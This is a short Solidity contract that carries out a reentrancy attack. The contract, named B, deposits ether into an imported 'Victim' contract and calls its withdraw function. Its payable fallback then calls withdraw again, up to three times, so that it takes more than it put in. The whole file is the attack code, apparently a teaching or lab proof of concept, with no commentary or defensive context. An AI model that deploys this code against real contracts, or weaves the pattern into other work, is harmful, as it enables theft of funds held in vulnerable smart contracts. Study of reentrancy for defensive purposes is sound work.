pragma solidity ^0.4.8;
import './Victim.sol';
contract B{
  Victim public v;
  uint public count;

  function B(address victim) {
    v = Victim(victim);
  }

  function attack() {
     v.withdraw();
  }  

  function deposit() public payable{
    v.deposit.value(msg.value)();
  }

  function () payable {
    count++;
    if (count < 3) {
      v.withdraw();
    }
  }
}
